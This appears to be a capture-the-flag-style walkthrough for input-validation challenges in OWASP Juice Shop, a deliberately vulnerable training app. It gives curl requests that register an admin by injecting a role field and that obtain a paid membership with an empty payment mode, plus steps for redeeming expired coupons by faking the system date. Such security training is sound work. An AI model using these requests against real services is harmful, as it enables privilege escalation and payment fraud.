# Improper Input Validation

## Admin Registration

Register as a user with administrator privileges

```bash
# register a user > inspect the response > add to the payload `"role":"admin"`
curl -sS http://juiceshop:3000/api/Users/ -H 'Content-Type: application/json' --data-raw $'{"email":"a@a.com","password":"12345","passwordRepeat":"12345","securityQuestion":{"id":3,"question":"Mother\'s birth date? (MM/DD/YY)","createdAt":"2023-11-07T08:41:38.130Z","updatedAt":"2023-11-07T08:41:38.130Z"},"securityAnswer":"000000","role":"admin"}' | jq
```

## Deluxe Fraud

Obtain a Deluxe Membership without paying for it

```bash
# enable wallet button
curl http://juiceshop:3000/rest/deluxe-membership -H 'Authorization: Bearer <AUTH_TOKEN>' -H 'Content-Type: application/json' --data-raw '{"paymentMode":""}'
```

<!--
## Empty User Registration

Register a user with an empty email and password
```bash
# TODO not implemented
```
-->

## Expired Coupon

Successfully redeem an expired campaign coupon code

* [libfaketime](https://github.com/wolfcw/libfaketime)
* [Is it possible change date in docker container?](https://stackoverflow.com/questions/29556879/is-it-possible-change-date-in-docker-container)
* [How to set system time dynamically in a Docker container](https://serverfault.com/questions/824631/how-to-set-system-time-dynamically-in-a-docker-container)

```bash
# pretty print main.js source
this.campaigns = {
  WMNSDY2019: {
    validOn: 1551999600000,
    discount: 75
  },
  ...
  ORANGE2023: {
    validOn: 1683154800000,
    discount: 40
  }
}

# if your epoch time is in milliseconds instead of seconds, either put a dot before last three digits, or remove the last three digits
date -d @1551999600.000
date -d @1551999600
# Thu Mar  7 23:00:00 UTC 2019

date -d @1683154800.000
# Wed May  3 23:00:00 UTC 2023 

# change date > apply coupon > pay
```
